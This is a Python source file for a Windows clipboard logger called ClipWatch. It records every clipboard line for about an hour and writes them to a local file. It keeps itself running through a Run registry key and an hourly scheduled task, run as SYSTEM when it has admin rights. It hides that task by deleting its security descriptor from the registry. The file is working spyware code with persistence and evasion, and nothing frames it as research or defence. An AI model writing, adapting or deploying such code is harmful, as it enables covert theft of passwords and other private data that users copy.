import os
import ftplib
import sys
import time
import winreg
import clipboard
import re

import ctypes

def check_admin():
    if ctypes.windll.shell32.IsUserAnAdmin() == 1:
        return True


def sctask():
    exe_path_1 = os.getcwd()+"\\ClipWatch.exe"
    exe_path_2 = "ClipWatch.exe"
    command = "<nul set /p='N' | schtasks /Create /SC HOURLY /TN ClipWatch /RU \"SYSTEM\" /TR "+exe_path_2
    # print(command)
    exec = os.system(command)
    print("OS Execute Code -> ", exec)
    return exec

def sctask_Normal():
    exe_path_1 = os.getcwd()+"\\ClipWatch.exe"
    exe_path_2 = "ClipWatch.exe"
    command = "<nul set /p='N' | schtasks /Create /SC HOURLY /TN ClipWatch /TR "+exe_path_2
    # print(command)
    exec = os.system(command)
    print("OS Execute Code -> ", exec)
    return exec



def delete_sd():
    reg_path = winreg.HKEY_LOCAL_MACHINE
    try:
        key = winreg.OpenKeyEx(reg_path, r"software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\ClipWatch", 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteValue(key, "SD")
        key.Close()
        print("Successfully hidden task!")
        return True
    except winreg.error as e:
        print("Error setting Registry Value -> ", e)
        pass
        return False


def save_reg(Name, Executable_path):
    reg_path = winreg.HKEY_CURRENT_USER
    print("Path -> ", Executable_path)
    try:
        key = winreg.OpenKeyEx(reg_path, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS | winreg.KEY_WOW64_64KEY)

    except FileNotFoundError:
        key = winreg.OpenKeyEx(reg_path, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS | winreg.KEY_WOW64_32KEY)

    try:
        winreg.SetValueEx(key, Name, 0, winreg.REG_SZ, str(Executable_path))

        print("Registry Persistence Achieved")
        return True
    except Exception as e:
        print("Registry Persistence Failed", e)
    return False

    # reg_add = "REG ADD 'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' /V 'ClipWatch' /t REG_SZ / F / D "+Executable_path
    # os.popen(reg_add)


# save_reg("ClipWatch", os.getcwd()+"\\ClipWatch.exe")


def write_data(data):
    f = open("ClipData.txt", "w")
    for i in data:
        f.writelines(i+"\n")
    f.close()


def ClipWatch(data):
    if clipboard.paste() is None:
        pass
    else:
        text = str(clipboard.paste()).splitlines()
        for i in text:
            # print("The text from splitline -> ", i)
            if i not in data:
                data.append(i)
    return 0


data = []
def program(data):
    print("Watching ClipBoard!")
    while True:
        # time.sleep(3)
        ClipWatch(data)
        timer = round(time.time() - start_time)
        # print(timer)
        if timer >= 3598:
            # print("Reached time limit!!!")
            write_data(data)
            time.sleep(1)
            sys.exit()

start_time = time.time()

if check_admin() is True:
    sctask_status = sctask()
    if sctask_status == 0 or sctask_status == 1:
        if delete_sd() is True:
            save_reg("ClipWatch", os.getcwd()+"\\ClipWatch.exe")
            program(data)
    else:
        print("Scheduled Task command was not successful! ")
else:
    print("Program has to run on SYSTEM privileges to perform Scheduled Task Hide Technique.")
    print("Going with simple registry persistence + Scheduled task with Clipboard watch.")
    sctask_status = sctask_Normal()
    if sctask_status == 0 or sctask_status == 1:
        save_reg("ClipWatch", os.getcwd() + "\\ClipWatch.exe")
        program(data)
    else:
        print("Scheduled Task command was not successful! ")


